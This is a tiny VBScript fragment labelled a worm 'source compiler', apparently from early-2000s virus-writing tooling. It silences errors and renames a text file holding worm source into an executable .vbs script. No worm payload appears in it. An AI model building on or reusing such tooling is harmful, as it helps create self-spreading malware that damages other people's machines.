rem Newborn Worm Source Compiler by Beebs AKA -NicX-
rem Created on 02\07\03
On Error Resume Next
f="c:\myworm.txt"
Set fso = CreateObject("Scripting.FileSystemObject") 
set File=fso.GetFile(f)
File.Name = "MyWorm.vbs"
